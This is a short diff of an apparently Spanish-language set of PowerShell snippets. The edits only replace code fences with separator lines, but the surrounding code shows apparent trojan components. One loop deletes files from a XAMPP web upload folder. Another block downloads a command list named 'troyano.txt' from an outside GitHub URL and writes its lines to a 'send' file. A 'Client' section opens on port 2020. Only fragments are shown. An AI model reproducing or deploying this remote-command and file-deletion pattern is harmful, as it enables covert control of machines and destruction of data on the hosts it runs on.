@@ -13,8 +13,7 @@ foreach($ficheros in (Get-ChildItem  "C:\xampp\htdocs\upload").name){
            Start-Sleep -Milliseconds 2000
     Remove-Item "C:\xampp\htdocs\upload\$ficheros"
 }
-```
-```Powershell
+--------------------------------------------------------------------------------------------
 ## Fichero con cmdlets
 $var = iwr https://raw.githubusercontent.com/marcofusco17/Powershell/main/troyano.txt
 foreach ($linea in $var.Content -split "n")
@@ -24,9 +23,7 @@ foreach ($linea in $var.Content -split "n")
         $linea.Replace(" ", "") | Out-File enviar.txt -Append
    }
 }
-```
-
-```Powershell
+----------------------------------------------------------------------------------------------
 
 ##Client
 $port=2020
